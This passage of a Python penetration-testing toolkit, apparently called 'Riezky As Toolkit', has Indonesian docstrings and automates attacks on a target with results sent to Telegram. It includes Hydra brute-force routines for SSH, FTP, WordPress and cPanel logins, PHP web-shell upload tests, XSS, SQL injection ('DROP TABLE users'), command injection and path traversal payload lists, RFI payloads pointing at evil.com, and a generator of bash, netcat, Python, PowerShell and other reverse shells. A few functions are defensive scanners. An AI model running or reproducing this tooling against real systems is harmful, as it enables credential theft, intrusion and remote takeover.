                else:
                    results.append(f"[green]SECURE: {ns} - Transfer refused[/green]")
            except Exception as e:
                results.append(f"[green]SECURE: {ns} - {str(e)}[/green]")

        if vulnerable:
            console.print(Panel.fit("\n".join(results), title="Zone Transfer Check", style="red"))
            telegram_msg = f"<b>🔓 DNS ZONE TRANSFER VULNERABILITY FOUND ON {target}</b>\n<pre>{clean_ansi_codes('\n'.join(results))}</pre>"
        else:
            console.print(Panel.fit("\n".join(results), title="Zone Transfer Check", style="green"))
            telegram_msg = f"<b>🔒 DNS ZONE TRANSFER SECURE ON {target}</b>\n<pre>{clean_ansi_codes('\n'.join(results))}</pre>"

        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def ssl_tls_scan(target):
    """Memeriksa konfigurasi SSL/TLS"""
    # Ensure testssl.sh is installed correctly
    testssl_dir = os.path.expanduser("~/tools/testssl.sh")
    testssl_path = os.path.join(testssl_dir, "testssl.sh")

    if not os.path.exists(testssl_path):
        console.print("[yellow]⏳ Installing testssl.sh...[/yellow]")
        try:
            os.makedirs(testssl_dir, exist_ok=True)
            subprocess.run(["git", "clone", "--depth", "1", "https://github.com/drwetter/testssl.sh.git", testssl_dir],
                          check=True)
            subprocess.run(["chmod", "+x", testssl_path], check=True)
            console.print("[green]✓ testssl.sh installed successfully[/green]")
        except Exception as e:
            console.print(f"[red]Error installing testssl.sh: {str(e)}[/red]")
            return

    console.print("[yellow]⏳ Performing SSL/TLS scan...[/yellow]")

    output_file = f"ssl_scan_{target.replace('.', '_')}.txt"
    command = [testssl_path, "--quiet", "--color", "0", target]

    try:
        start_time = time.time()
        with open(output_file, 'w') as f:
            process = subprocess.Popen(command, stdout=f, stderr=subprocess.PIPE, text=True)
            process.communicate(timeout=600)

        end_time = time.time()
        duration = end_time - start_time

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()

            # Extract vulnerabilities
            vulns = []
            for line in output.splitlines():
                if "NOT ok" in line or "LOW" in line or "MEDIUM" in line or "HIGH" in line:
                    vulns.append(line)

            if vulns:
                vuln_output = "\n".join(vulns)
                console.print(Panel.fit(vuln_output, title="SSL/TLS Vulnerabilities", style="red"))

            console.print(Panel.fit(output, title="SSL/TLS Scan Results", style="green"))
            console.print(f"[green]✓ Scan completed in {duration:.2f} seconds[/green]")

            telegram_msg = f"<b>🔐 SSL/TLS SCAN FOR {target}</b>\nDuration: {duration:.2f}s\n"
            if vulns:
                telegram_msg += f"Found {len(vulns)} vulnerabilities\n"
            telegram_msg += f"<pre>{clean_ansi_codes(output)}</pre>"

            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"SSL/TLS scan results for {target}")
        else:
            console.print("[red]SSL scan output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# BRUTE FORCE & CREDENTIAL STUFFING TOOLS
# =========================================

def brute_force_attack(target, service, username=None, mode="cepat"):
    """Melakukan brute force attack pada berbagai layanan"""
    if not ensure_tool("hydra", "sudo apt install hydra -y"):
        return

    console.print(f"[yellow]⏳ Preparing {service} brute force attack...[/yellow]")

    if service == "http-form":
        login_url = console.input("[bold green]Enter login URL: [/]").strip()
        form_data = console.input("[bold green]Enter form data (e.g. user=^USER^&pass=^PASS^): [/]").strip()
        fail_condition = console.input("[bold green]Enter fail condition (e.g. 'Login failed'): [/]").strip()

    wordlist_dir = os.path.expanduser("~/.wordlists")
    os.makedirs(wordlist_dir, exist_ok=True)

    if mode == "lengkap":
        userlist = os.path.join(wordlist_dir, "big-users.txt")
        passlist = os.path.join(wordlist_dir, "big-passwords.txt")
        if not os.path.exists(userlist):
            subprocess.run(["wget", "-O", userlist, "https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt"], check=True)
        if not os.path.exists(passlist):
            subprocess.run(["wget", "-O", passlist, "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"], check=True)
        threads = 16
    else:
        userlist = os.path.join(wordlist_dir, "small-users.txt")
        passlist = os.path.join(wordlist_dir, "small-passwords.txt")
        if not os.path.exists(userlist):
            subprocess.run(["wget", "-O", userlist, "https://github.com/danielmiessler/SecLists/raw/master/Usernames/top-usernames-shortlist.txt"], check=True)
        if not os.path.exists(passlist):
            subprocess.run(["wget", "-O", passlist, "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"], check=True)
        threads = 8

    output_file = f"hydra_{target.replace('.', '_')}_{service}.txt"
    command = ["hydra", "-I"]

    if username:
        command.extend(["-l", username])
    else:
        command.extend(["-L", userlist])

    command.extend(["-P", passlist, "-t", str(threads), "-o", output_file])

    if service == "ftp":
        command.extend(["-s", "21", "ftp://" + target])
    elif service == "ssh":
        command.extend(["-s", "22", "ssh://" + target])
    elif service == "http-form":
        command.extend(["http-post-form", f"{login_url}:{form_data}:{fail_condition}"])
    elif service == "wordpress":
        command.extend(["http-form", f"{target}/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"])
    elif service == "cpanel":
        command.extend(["http-form", f"{target}:2083/login.php:user=^USER^&pass=^PASS^:incorrect"])

    try:
        console.print("[red]⚠️ Starting brute force attack (this may take time)...[/red]")
        start_time = time.time()

        # Run hydra with live output
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Live output processing
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                if "403" in output or "captcha" in output.lower():
                    console.print("[red]⛔ Protection detected! Stopping attack...[/red]")
                    process.terminate()
                    break
                console.print(output.strip())

        stderr = process.stderr.read()
        if stderr:
            console.print(f"[red]{stderr}[/red]")

        end_time = time.time()
        duration = end_time - start_time

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                file_output = f.read()

            if "successfully" in file_output.lower():
                console.print(Panel.fit(file_output, title="Brute Force Results", style="red"))
                telegram_msg = f"<b>🔓 BRUTE FORCE SUCCESS ON {target} ({service})</b>\n<pre>{clean_ansi_codes(file_output)}</pre>"
            else:
                console.print(Panel.fit("No valid credentials found", title="Brute Force Results", style="yellow"))
                telegram_msg = f"<b>🔒 BRUTE FORCE FAILED ON {target} ({service})</b>\nNo valid credentials found"

            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Brute force results for {target} ({service})")
        else:
            console.print("[red]Hydra output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# LOGIN PAGE & ADMIN FINDER
# =========================================

def find_login_pages(target, mode="cepat"):
    """Mencari halaman login/admin pada website"""
    console.print(f"[yellow]⏳ Searching for login pages on [bold]{target}[/bold]...[/yellow]")

    wordlist_dir = os.path.expanduser("~/.wordlists")
    os.makedirs(wordlist_dir, exist_ok=True)

    if mode == "lengkap":
        wordlist_path = os.path.join(wordlist_dir, "login-paths-large.txt")
        if not os.path.exists(wordlist_path):
            with Status("Downloading wordlist...", spinner="dots"):
                subprocess.run(
                    ["wget", "-O", wordlist_path, "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonAdminLoginPaths.txt"],
                    check=True
                )
    else:
        wordlist_path = os.path.join(wordlist_dir, "login-paths-small.txt")
        if not os.path.exists(wordlist_path):
            subprocess.run(
                ["wget", "-O", wordlist_path, "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common-login-paths.txt"],
                check=True
            )

    protocol = detect_protocol(target)
    base_url = f"{protocol}://{target}"

    found_pages = []

    with open(wordlist_path, 'r') as f:
        paths = [line.strip() for line in f if line.strip()]

    def check_path(path):
        url = f"{base_url}{path}"
        try:
            headers = {"User-Agent": random.choice(get_user_agents())}
            response = requests.get(url, headers=headers, timeout=8, verify=False, allow_redirects=True)

            if response.status_code == 200:
                if "login" in response.text.lower() or "password" in response.text.lower():
                    return (url, response.status_code, "Likely Login Page")
                elif "admin" in response.text.lower():
                    return (url, response.status_code, "Likely Admin Page")
                else:
                    return (url, response.status_code, "Potential")
            elif response.status_code == 403:
                return (url, response.status_code, "Forbidden")
            elif response.status_code == 401:
                return (url, response.status_code, "Unauthorized")
        except:
            return None

    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn()
    ) as progress:
        task = progress.add_task("[cyan]Checking paths...", total=len(paths))

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_path, path): path for path in paths}

            for future in concurrent.futures.as_completed(futures):
                progress.update(task, advance=1)
                result = future.result()
                if result:
                    found_pages.append(result)

    if found_pages:
        table = Table(title="Login/Admin Pages Found", style="green")
        table.add_column("URL")
        table.add_column("Status")
        table.add_column("Type")

        for url, status, page_type in found_pages:
            if "Likely" in page_type:
                table.add_row(url, str(status), f"[green]{page_type}[/green]")
            else:
                table.add_row(url, str(status), f"[yellow]{page_type}[/yellow]")

        console.print(table)

        results = "\n".join([f"{url} ({status}) - {page_type}" for url, status, page_type in found_pages])
        telegram_msg = f"<b>🔑 LOGIN/ADMIN PAGES ON {target}</b>\n\n{results}"
    else:
        console.print(Panel.fit("No login/admin pages found", title="Login Finder", style="yellow"))
        telegram_msg = f"<b>🔑 LOGIN/ADMIN PAGES ON {target}</b>\nNo pages found"

    send_to_telegram(telegram_msg)

# =========================================
# MALWARE SCANNER / HASH CHECKER
# =========================================

def malware_scan(file_path):
    """Memindai file menggunakan VirusTotal API"""
    VIRUSTOTAL_API_KEY = os.getenv("VIRUSTOTAL_API_KEY", "")

    if not VIRUSTOTAL_API_KEY:
        console.print("[red]VirusTotal API key not set! Set VIRUSTOTAL_API_KEY environment variable.[/red]")
        return

    console.print(f"[yellow]⏳ Scanning file: [bold]{file_path}[/bold]...[/yellow]")

    try:
        # Calculate file hash
        with open(file_path, "rb") as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()

        # Check hash with VirusTotal
        url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}

        response = requests.get(url, headers=headers, timeout=20)

        if response.status_code == 200:
            data = response.json()
            attributes = data["data"]["attributes"]
            results = attributes["last_analysis_results"]

            malicious = attributes["last_analysis_stats"]["malicious"]
            suspicious = attributes["last_analysis_stats"]["suspicious"]

            table = Table(title="Malware Scan Results", style="green")
            table.add_column("Engine")
            table.add_column("Result")
            table.add_column("Category")

            for engine, result in results.items():
                if result["category"] == "malicious":
                    table.add_row(engine, result["result"], f"[red]{result['category']}[/red]")
                elif result["category"] == "suspicious":
                    table.add_row(engine, result["result"], f"[yellow]{result['category']}[/yellow]")
                else:
                    table.add_row(engine, result["result"], f"[green]{result['category']}[/green]")

            console.print(Panel.fit(f"File: {file_path}\nSHA-256: {file_hash}\nMalicious: {malicious}, Suspicious: {suspicious}",
                                  title="Scan Summary", style="blue"))
            console.print(table)

            telegram_msg = f"<b>🦠 MALWARE SCAN RESULTS FOR {os.path.basename(file_path)}</b>\n"
            telegram_msg += f"SHA-256: <code>{file_hash}</code>\n"
            telegram_msg += f"Malicious: {malicious}, Suspicious: {suspicious}\n"
            telegram_msg += f"Full report: https://www.virustotal.com/gui/file/{file_hash}"
        else:
            console.print(f"[red]VirusTotal API error: {response.text}[/red]")
            telegram_msg = f"<b>🦠 MALWARE SCAN FAILED FOR {os.path.basename(file_path)}</b>\nError:  {response.text}"

        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# FILE UPLOAD EXPLOIT CHECKER
# =========================================

def check_file_upload(target):
    """Menguji kerentanan unggah file"""
    console.print(f"[yellow]⏳ Testing file upload vulnerability on [bold]{target}[/bold]...[/yellow]")

    upload_url = console.input("[bold green]Enter upload URL: [/]").strip()
    file_param = console.input("[bold green]Enter file parameter name: [/]").strip()

    # Create test files
    test_files = [
        ("shell.php", "<?php echo 'VULNERABLE!'; ?>", "application/x-php"),
        ("shell.jpg.php", "<?php echo 'VULNERABLE!'; ?>", "image/jpeg"),
        ("shell.png", "<?php echo 'VULNERABLE!'; ?>", "image/png"),
        ("shell.php.png", "<?php echo 'VULNERABLE!'; ?>", "image/png"),
        ("shell.php%00.jpg", "<?php echo 'VULNERABLE!'; ?>", "image/jpeg"),
        ("shell.php.", "<?php echo 'VULNERABLE!'; ?>", "application/x-php"),
    ]

    results = []

    for filename, content, mime_type in test_files:
        try:
            files = {file_param: (filename, content, mime_type)}
            response = requests.post(upload_url, files=files, timeout=10, verify=False)

            if response.status_code == 200:
                if "VULNERABLE!" in response.text:
                    results.append((filename, "Success", "Server executed file!"))
                else:
                    # Try to find the uploaded file
                    uploaded_url = re.search(r'href="([^"]+)"', response.text)
                    if uploaded_url:
                        file_url = uploaded_url.group(1)
                        file_response = requests.get(file_url, timeout=8, verify=False)
                        if "VULNERABLE!" in file_response.text:
                            results.append((filename, "Success", f"File executed at {file_url}"))
                        else:
                            results.append((filename, "Uploaded", f"File stored at {file_url}"))
                    else:
                        results.append((filename, "Uploaded", "But execution not confirmed"))
            else:
                results.append((filename, "Failed", f"Status: {response.status_code}"))
        except Exception as e:
            results.append((filename, "Error", str(e)))

    if results:
        table = Table(title="File Upload Test Results", style="green")
        table.add_column("Filename")
        table.add_column("Result")
        table.add_column("Details")

        for filename, result, details in results:
            if "Success" in result:
                table.add_row(filename, f"[red]{result}[/red]", details)
            elif "Uploaded" in result:
                table.add_row(filename, f"[yellow]{result}[/yellow]", details)
            else:
                table.add_row(filename, result, details)

        console.print(table)

        results_text = "\n".join([f"{f}: {r} - {d}" for f, r, d in results])
        telegram_msg = f"<b>📤 FILE UPLOAD TEST ON {target}</b>\n\n{results_text}"
    else:
        console.print(Panel.fit("No results from file upload tests", title="File Upload Test", style="yellow"))
        telegram_msg = f"<b>📤 FILE UPLOAD TEST ON {target}</b>\nNo results"

    send_to_telegram(telegram_msg)

# =========================================
# INJECTION TESTER
# =========================================

def injection_tester(target):
    """Menguji berbagai jenis kerentanan injeksi"""
    console.print(f"[yellow]⏳ Testing injection vulnerabilities on [bold]{target}[/bold]...[/yellow]")

    # Determine if we're testing URL parameters or form
    if "?" in target:
        test_url = target
        is_form = False
    else:
        test_url = console.input("[bold green]Enter form URL: [/]").strip()
        form_params = console.input("[bold green]Enter form parameters (e.g. param1=value1&param2=value2): [/]").strip()
        is_form = True

    payloads = {
        "XSS": [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "onload=alert(1)"
        ],
        "SQLi": [
            "' OR '1'='1",
            "' OR SLEEP(5)--",
            "\" OR \"1\"=\"1",
            "'; DROP TABLE users--"
        ],
        "Command Injection": [
            "; id",
            "| id",
            "&& id",
            "`id`",
            "$(id)"
        ],
        "Path Traversal": [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd"
        ]
    }

    results = []

    for vuln_type, payload_list in payloads.items():
        for payload in payload_list:
            try:
                if is_form:
                    # Split form parameters and inject payload
                    params = {}
                    for pair in form_params.split("&"):
                        key, value = pair.split("=")
                        params[key] = value + payload

                    response = requests.post(test_url, data=params, timeout=8, verify=False)
                else:
                    # Inject into URL parameters
                    injected_url = test_url + payload
                    response = requests.get(injected_url, timeout=8, verify=False)

                # Detection logic
                detected = False
                reason = ""

                if vuln_type == "XSS":
                    if payload in response.text:
                        detected = True
                        reason = "Payload reflected in response"
                    elif "alert(1)" in response.text:
                        detected = True
                        reason = "Script execution detected"

                elif vuln_type == "SQLi":
                    if "error in your SQL syntax" in response.text:
                        detected = True
                        reason = "SQL error message"
                    elif "mysql" in response.text and "error" in response.text:
                        detected = True
                        reason = "Database error message"
                    elif "syntax error" in response.text and "sql" in response.text.lower():
                        detected = True
                        reason = "SQL syntax error"
                    elif response.elapsed.total_seconds() > 3 and "SLEEP" in payload:
                        detected = True
                        reason = "Time-based detection"

                elif vuln_type == "Command Injection":
                    if "uid=" in response.text or "gid=" in response.text:
                        detected = True
                        reason = "Command output detected"
                    elif "command not found" in response.text or "syntax error" in response.text:
                        detected = True
                        reason = "Command error message"

                elif vuln_type == "Path Traversal":
                    if "root:" in response.text and "/bin/" in response.text:
                        detected = True
                        reason = "/etc/passwd content detected"

                if detected:
                    results.append((vuln_type, payload, "VULNERABLE", reason))
                else:
                    results.append((vuln_type, payload, "Not Vulnerable", ""))

            except Exception as e:
                results.append((vuln_type, payload, "Error", str(e)))

    if results:
        table = Table(title="Injection Test Results", style="green")
        table.add_column("Type")
        table.add_column("Payload")
        table.add_column("Result")
        table.add_column("Details")

        for vuln_type, payload, result, details in results:
            if "VULNERABLE" in result:
                table.add_row(vuln_type, payload, f"[red]{result}[/red]", details)
            else:
                table.add_row(vuln_type, payload, result, details)

        console.print(table)

        results_text = "\n".join([f"{t}: {p} - {r} {d}" for t, p, r, d in results])
        telegram_msg = f"<b>💉 INJECTION TEST ON {target}</b>\n\n{results_text}"
    else:
        console.print(Panel.fit("No injection vulnerabilities detected", title="Injection Test", style="green"))
        telegram_msg = f"<b>💉 INJECTION TEST ON {target}</b>\nNo vulnerabilities detected"

    send_to_telegram(telegram_msg)

# =========================================
# REVERSE SHELL GENERATOR
# =========================================

def generate_reverse_shell():
    """Membuat payload reverse shell"""
    console.print("[yellow]⏳ Generating reverse shell payloads...[/yellow]")

    ip = console.input("[bold green]Enter your IP: [/]").strip()
    port = console.input("[bold green]Enter port: [/]").strip()

    payloads = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "PowerShell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "Netcat": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "Java": f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();",
        "Ruby": f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        "Perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    }

    console.print(Panel.fit("Reverse Shell Payloads", title="Generated Payloads", style="blue"))

    for lang, payload in payloads.items():
        console.print(f"[bold]{lang}:[/bold]")
        console.print(Panel.fit(payload, style="cyan"))

    listener_cmd = f"nc -lvnp {port}"
    console.print(Panel.fit(f"Start listener with: [bold green]{listener_cmd}[/bold green]",
                          title="Listener Command", style="green"))

    # Save payloads to file
    output_file = f"reverse_shell_{ip}_{port}.txt"
    with open(output_file, 'w') as f:
        f.write(f"Reverse Shell Payloads for {ip}:{port}\n")
        f.write("="*50 + "\n")
        for lang, payload in payloads.items():
            f.write(f"{lang}:\n{payload}\n\n")
        f.write(f"\nListener command:\n{listener_cmd}\n")

    send_file_to_telegram(output_file, f"Reverse shell payloads for {ip}:{port}")
    send_to_telegram(f"<b>🐚 REVERSE SHELL PAYLOADS</b>\nGenerated for {ip}:{port}\nListener: <code>{listener_cmd}</code>")

# =========================================
# WEBSHELL / BACKDOOR DETECTOR
# =========================================

def detect_webshells(target):
    """Mendeteksi webshell pada website"""
    console.print(f"[yellow]⏳ Scanning for webshells on [bold]{target}[/bold]...[/yellow]")

    wordlist_dir = os.path.expanduser("~/.wordlists")
    os.makedirs(wordlist_dir, exist_ok=True)

    wordlist_path = os.path.join(wordlist_dir, "webshells.txt")
    if not os.path.exists(wordlist_path):
        with Status("Downloading wordlist...", spinner="dots"):
            subprocess.run(
                ["wget", "-O", wordlist_path, "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CommonBackdoors.txt"],
                check=True
            )

    protocol = detect_protocol(target)
    base_url = f"{protocol}://{target}"

    found_shells = []

    with open(wordlist_path, 'r') as f:
        paths = [line.strip() for line in f if line.strip()]

    def check_shell(path):
        url = f"{base_url}{path}"
        try:
            headers = {"User-Agent": random.choice(get_user_agents())}
            response = requests.get(url, headers=headers, timeout=8, verify=False)

            if response.status_code == 200:
                # Check for suspicious keywords
                suspicious_keywords = ["shell", "backdoor", "cmd", "exec", "system", "passthru", "wso"]
                content = response.text.lower()

                if any(keyword in content for keyword in suspicious_keywords):
                    return (url, response.status_code, "Suspicious Content")
                else:
                    return (url, response.status_code, "Potential")
        except:
            return None

    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        BarColumn(),
        "[progress.percentage]{task.percentage:>3.0f}%",
        TimeRemainingColumn()
    ) as progress:
        task = progress.add_task("[cyan]Checking paths...", total=len(paths))

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_shell, path): path for path in paths}

            for future in concurrent.futures.as_completed(futures):
                progress.update(task, advance=1)
                result = future.result()
                if result:
                    found_shells.append(result)

    if found_shells:
        table = Table(title="Webshells Detected", style="red")
        table.add_column("URL")
        table.add_column("Status")
        table.add_column("Details")

        for url, status, details in found_shells:
            table.add_row(url, str(status), details)

        console.print(table)

        results = "\n".join([f"{url} ({status}) - {details}" for url, status, details in found_shells])
        telegram_msg = f"<b>🕷️ WEBSHELLS DETECTED ON {target}</b>\n\n{results}"
    else:
        console.print(Panel.fit("No webshells detected", title="Webshell Scan", style="green"))
        telegram_msg = f"<b>🕷️ WEBSHELL SCAN ON {target}</b>\nNo webshells detected"

    send_to_telegram(telegram_msg)

# =========================================
# LOG4SHELL & CVE SCANNER
# =========================================

def cve_scanner(target):
    """Memindai kerentanan CVE terkenal seperti Log4Shell"""
    if not ensure_tool("nuclei", "go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"):
        return

    console.print(f"[yellow]⏳ Scanning for critical CVEs on [bold]{target}[/bold]...[/yellow]")

    # Update nuclei templates
    subprocess.run(["nuclei", "-update-templates"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    output_file = f"cve_scan_{target.replace('.', '_')}.txt"
    command = [
        "nuclei", "-u", target,
        "-severity", "critical,high",
        "-tags", "cve,log4shell,rce",
        "-timeout", "10",
        "-rate-limit", "50",
        "-o", output_file
    ]

    try:
        console.print("[red]⚠️ Starting CVE scan (this may take time)...[/red]")
        start_time = time.time()

        # Run nuclei with live output
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Live output processing
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                console.print(output.strip())

        stderr = process.stderr.read()
        if stderr:
            console.print(f"[red]{stderr}[/red]")

        end_time = time.time()
        duration = end_time - start_time

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                file_output = f.read()

            if not file_output.strip():
                file_output = "No critical vulnerabilities found"
                console.print(Panel.fit(file_output, title="CVE Scan Results", style="green"))
            else:
                console.print(Panel.fit(file_output, title="CVE Scan Results", style="red"))

            console.print(f"[green]✓ Scan completed in {duration:.2f} seconds[/green]")

            telegram_msg = f"<b>🛡️ CVE SCAN RESULTS FOR {target}</b>\n<pre>{clean_ansi_codes(file_output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"CVE scan results for {target}")
        else:
            console.print("[red]Nuclei output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# TRAFFIC MONITOR (BLUE TEAM FEATURE)
# =========================================

def monitor_traffic(duration=30):
    """Memantau koneksi jaringan aktif"""
    if not ensure_tool("iftop", "sudo apt install iftop -y"):
        return

    console.print(f"[yellow]⏳ Monitoring network traffic for {duration} seconds...[/yellow]")

    output_file = f"traffic_monitor_{int(time.time())}.txt"

    try:
        with open(output_file, 'w') as f:
            process = subprocess.Popen(["sudo", "iftop", "-t", "-s", str(duration)],
                                      stdout=f, stderr=subprocess.PIPE, text=True)
            process.communicate()

        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()

            console.print(Panel.fit(output, title="Traffic Monitoring", style="blue"))
            telegram_msg = f"<b>📡 TRAFFIC MONITORING ({duration}s)</b>\n<pre>{clean_ansi_codes(output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Traffic monitoring results")
        else:
            console.print("[red]Traffic output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# LFI/RFI/PATH TRAVERSAL CHECKER
# =========================================

def check_file_inclusion(target):
    """Menguji kerentanan file inclusion"""
    console.print(f"[yellow]⏳ Testing file inclusion vulnerabilities on [bold]{target}[/bold]...[/yellow]")

    # Determine if we're testing URL parameters or form
    if "?" in target:
        test_url = target
        is_form = False
    else:
        test_url = console.input("[bold green]Enter vulnerable URL: [/]").strip()
        is_form = False

    payloads = {
        "LFI (Local File Inclusion)": [
            "../../../../etc/passwd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%252f..%252fetc/passwd"
        ],
        "RFI (Remote File Inclusion)": [
            "http://evil.com/shell.txt",
            "\\\\evil.com\\share\\shell.txt",
            "//evil.com/shell.txt"
        ],
        "Path Traversal": [
            "/var/www/html/config.php",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ".../..././.../..././windows/win.ini"
        ]
    }

    results = []

    for vuln_type, payload_list in payloads.items():
        for payload in payload_list:
            try:
                if is_form:
                    # This would be implemented similarly to the injection tester
                    # but simplified for this example
                    response = requests.post(test_url, data={"param": payload}, timeout=8, verify=False)
                else:
                    # Inject into URL parameters
                    injected_url = test_url + payload
                    response = requests.get(injected_url, timeout=8, verify=False)

                # Detection logic
                detected = False
                reason = ""

                if "root:" in response.text and "/bin/" in response.text:
                    detected = True
                    reason = "/etc/passwd content detected"
                elif "<?php" in response.text or "eval(" in response.text:
                    detected = True
                    reason = "PHP code execution detected"
                elif "[extensions]" in response.text or "[fonts]" in response.text:
                    detected = True
                    reason = "Windows file content detected"
                elif response.status_code == 200 and len(response.text) > 0:
                    # Generic detection
                    detected = True
                    reason = "Unexpected response"

                if detected:
                    results.append((vuln_type, payload, "VULNERABLE", reason))
                else:
                    results.append((vuln_type, payload, "Not Vulnerable", ""))

            except Exception as e:
                results.append((vuln_type, payload, "Error", str(e)))

    if results:
        table = Table(title="File Inclusion Test Results", style="green")
        table.add_column("Type")
        table.add_column("Payload")
        table.add_column("Result")
        table.add_column("Details")

        for vuln_type, payload, result, details in results:
            if "VULNERABLE" in result:
                table.add_row(vuln_type, payload, f"[red]{result}[/red]", details)
            else:
                table.add_row(vuln_type, payload, result, details)

        console.print(table)

        results_text = "\n".join([f"{t}: {p} - {r} {d}" for t, p, r, d in results])
        telegram_msg = f"<b>📂 FILE INCLUSION TEST ON {target}</b>\n\n{results_text}"
    else:
        console.print(Panel.fit("No file inclusion vulnerabilities detected", title="File Inclusion Test", style="green"))
        telegram_msg = f"<b>📂 FILE INCLUSION TEST ON {target}</b>\nNo vulnerabilities detected"

    send_to_telegram(telegram_msg)

# =========================================
# UTILITIES AND SYSTEM FUNCTIONS
# =========================================

def update_toolkit():
    """Memperbarui toolkit dan semua dependensi"""
    console.print("[yellow]⏳ Updating Riezky As Toolkit...[/yellow]")

    try:
        # Update system packages
        subprocess.run(["sudo", "apt", "update"], check=True)
        subprocess.run(["sudo", "apt", "upgrade", "-y"], check=True)

        # Update Go tools
        go_tools = [
            "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
            "github.com/projectdiscovery/httpx/cmd/httpx@latest",
            "github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
            "github.com/OJ/gobuster/v3@latest",
            "github.com/tomnomnom/assetfinder@latest",
            "github.com/tomnomnom/httprobe@latest"
        ]

        for tool in go_tools:
            subprocess.run(["go", "install", "-v", tool], check=True)

        # Update Python tools
        subprocess.run(["pip", "install", "--upgrade", "wafw00f", "theHarvester", "requests"], check=True)

        # Update Nuclei templates
        subprocess.run(["nuclei", "-update-templates"], check=True)

        # Update testssl.sh
        testssl_dir = os.path.expanduser("~/tools/testssl.sh")
        if os.path.exists(testssl_dir):
            subprocess.run(["git", "-C", testssl_dir, "pull"], check=True)

        console.print("[green]✓ Toolkit updated successfully![/green]")
        send_to_telegram("🔄 <b>RIEZKY AS TOOLKIT UPDATED</b>\nAll tools and templates have been updated")
    except Exception as e:
        console.print(f"[red]Update failed: {str(e)}[/red]")
        send_to_telegram(f"❌ <b>UPDATE FAILED</b>\nError: {str(e)}")

def install_dependencies():
